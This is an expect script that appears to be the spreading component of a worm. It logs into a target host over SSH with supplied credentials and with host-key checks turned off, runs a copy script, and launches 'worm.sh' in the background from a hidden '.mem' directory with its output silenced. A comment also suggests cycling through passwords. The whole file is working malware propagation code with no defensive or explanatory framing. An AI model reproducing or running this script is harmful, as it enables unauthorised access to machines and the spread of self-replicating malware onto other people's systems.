#!/usr/bin/expect -f

set username [lindex $argv 0]
set ip [lindex $argv 1]
set password [lindex $argv 2]

# timeout for SSH response
set timeout 5
eval spawn ssh -oStrictHostKeyChecking=no -oCheckHostIP=no $username@$ip

set password_attempts 0
expect {
	{[Pp]assword} {
		# We could remove this to cycle through passwords
		if {$password_attempts > 0} {
			# failed authentication
			exit 2;
		}

		puts "entering pass"
		send "$password\r"
		incr password_attempts;
		puts $password_attempts;
		
		exp_continue
	}
	-nocase "last login" {
		# we're in!

		set timeout 10
	 	exec ./copy.sh $username $ip $password
		expect eof
		
		puts "running worm\r"
		send "cd .mem && nohup ./worm.sh &>/dev/null &!\r"
		expect "\\\[1\\\]"
		send "exit\r"
	}	
	timeout {
		exit 1;
	}
	eof {
		# failed authentication
		exit 2;	
	}
}

# Done!
exit 0;
